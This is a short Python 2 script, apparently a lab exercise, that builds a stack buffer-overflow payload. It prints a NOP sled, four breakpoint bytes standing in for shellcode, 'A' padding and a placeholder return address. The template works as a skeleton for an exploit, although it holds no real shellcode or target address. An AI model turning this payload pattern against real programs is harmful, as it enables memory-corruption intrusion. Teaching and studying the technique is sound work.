#!/usr/bin/python
#attack1.py

n=100
nops_count=12
trap_count=4

#make sure that a jmp can be made anywhere in the buffer
#by inserting nops instruction before the actual shell code 
nopsled = '\x90' * nops_count
shellcode = '\xcc' * trap_count
pad = 'A' * (n - nops_count - len(shellcode))
rip = 'ABCDEFGH'

print nopsled + shellcode + pad + rip
